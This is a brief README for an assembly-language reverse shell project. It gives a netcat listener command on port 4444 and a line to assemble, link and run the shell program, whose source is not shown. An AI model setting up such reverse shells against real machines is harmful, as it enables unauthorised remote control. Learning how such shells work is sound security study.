# ReverseShell_ASM

On a terminal first launch this command :
```nc -lv 4444```
And on an another terminal :
```nasm -f elf32 server.asm && ld -m elf_i386 -s -o server server.o && ./server```

